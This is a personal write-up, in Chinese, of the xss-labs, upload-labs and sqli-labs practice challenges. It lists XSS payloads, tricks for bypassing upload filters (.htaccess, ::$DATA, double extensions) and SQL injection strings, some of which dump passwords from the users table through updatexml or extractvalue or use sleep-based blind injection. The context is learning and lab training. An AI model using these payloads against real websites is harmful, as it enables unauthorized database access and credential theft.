# xss-labs writeup

注入

```js
标签<script></script>
onclick="javascript:alert(1);"  onkeydown=""
<a href="javascript:alert(1)">abc<a>

type="hidden"
```



过滤-绕过

```
大小写绕过
重写绕过

```

# upload-labs writeup

各关卡知识点：

```php
1.前端js对php后缀的限制
2.对content-type的限制
3.后缀绕过phtml
4..htaccess的借助
5..htaccess的借助，大小写
6.后缀中加空格绕过！！！！！！！！！纯大写的后缀绕过
7.后缀中加.绕过
	labs7.php.提示上传出错，labs7.jpg.成功上传并且改文件名字了
	但提示没说限制.htaccess，但是不能上传
8.后缀中加::$DATA绕过
9. .空格.的绕过！！！！！！！！！！::$DATA上传成功了！！
10.后缀双写绕过
	理论来说应该是. .但是无法上传啊？？
11.双写绕过!!!!!!!!!
```

# sql-labs write up



`安全就是这么狗`

```php
卧槽！！！
原来不是我下的sqli-labs文件有问题
原来不是我的hackbar有问题
原来不是我的php函数出问题了
原来我的数据库没问题
当我吧playload的内容直接写到php文档上不出问题
当我直接在浏览器注入时就出问题
仔细对比一下写入的txt文档内容的时候我才发现'变成了\',这尼玛原来我的php帮我防sql注入了！！！！操
php5.2.17配置了php.ini的函数为Off依然解决不了问题，
换了个版本，php5.6.9卧槽！！瞬间解决问题，
（我当初下php版本时为嘛下哪个？！？！！

一个php版本的问题，拖了我2-3周没好好学sql注入了
```

`易错点-我的误区`

```sql
-1' union select 1,2,3--+
1' order by 3--+
分清正负号很关键
```

开始吧，一天干完sqli-labs20关



## labs1--单引号字符型

![image-20220225103159195](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225103159195.png)

## labs2--整形

![image-20220225103844985](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225103844985.png)

## labs3--('')字符型

![image-20220225104036251](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225104036251.png)

## labs4--加双引号的类型

![image-20220225104919299](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225104919299.png)





## labs5--双注入单引号字符型

![image-20220225114303822](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225114303822.png)

可以用报错注入1' and updatexml(1,concat(0x5e,(select group_concat(password) from security.users),0x5e),1) --+

substr((),1)用于字符显示不全的题目；



## labs6--双注入双引号字符型

![image-20220225155544470](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225155544470.png)

## labs7-----额闯不过去，，，文件就是写不到路径里，搞了一下午了



## labs8-盲注就这样得依靠外力

爆库成功

![image-20220226202006530](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226202006530.png)

接着借助外了

## labs9---时间盲注（好麻烦--去学sqlmap了

?id=1' and if(left(database(),8)='security' , sleep(3), 1) --+

爆库成功的标志，时间延迟了

![image-20220226195242584](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226195242584.png)



## labs10--同9一样麻烦

?id=1" and if(left(database(),8)='security' , sleep(3), 1) --+

爆库成功的标志，

sqlmap比较好

![image-20220226195903391](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226195903391.png)





## labs11---登录能成功，但回显不了想要的

！！！！！！！！！牛逼成功了，（为什么hackbar里post不成功，要抓包才成功

![image-20220226133650937](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226133650937.png)

## labs12--和11差不多

![image-20220226134217277](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226134217277.png)



## labs13--和11差不多

admisdn') and updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1) -- -

![image-20220226140959525](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226140959525.png)



## labs14--和11差不多

admin123" and extractvalue(1,concat(0x7e,(select group_concat(password) from security.users))) and "

![image-20220226141704817](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226141704817.png)



## labs15--和9差不多

uname=admin' and if(left(database(),8)='security',sleep(5),1)--+&passwd=admin&submit=Submit

时间延迟爆库成功了,就和9差不多了

![image-20220226201027167](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226201027167.png)



## labs16--和9差不多

## labs17--报错类型

算是成功了

![image-20220226201717914](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220226201717914.png)







`18，19，20主要是请求头的一些注入相关的`

## labs18--user Agent

![image-20220225174408061](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225174408061.png)





## labs19--referer

报错注入一下子就过去了，另一个怎么就是成功不了

![image-20220225204011709](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225204011709.png)



## labs20--cookie

![image-20220225171829693](C:\Users\27969\AppData\Roaming\Typora\typora-user-images\image-20220225171829693.png)
